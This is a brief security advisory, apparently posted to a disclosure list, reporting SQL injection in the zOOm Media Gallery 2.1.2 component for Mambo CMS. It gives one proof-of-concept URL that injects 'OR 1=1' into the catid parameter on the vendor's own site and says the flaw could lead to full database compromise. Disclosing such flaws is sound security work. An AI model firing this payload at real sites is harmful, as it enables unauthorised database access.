Subject: zOOM Media Gallery - Simple SQL Injection discovery



Description:
	zOOm Media Gallery (http://zoom.ummagumma.nl) is a php/sql 	component+module for 	MamboCMS and is in use by many sites of the internet.

	I discover a simple SQL Injection in it.
 
Affected Versions:
      zOOm Image Gallery 2.1.2, *
 
POC:
      It is possible to proof my concept using the original site of zOOM:
      	http://zoom.ummagumma.nl/mikedeboer/index.php?option=com_zoom&Itemid=39&catid=2+OR+1=1   
	the above url can show all images in all categories of images of the 	zOOM 	gallery database but other commands are also possible that can 	result in a	database owning.
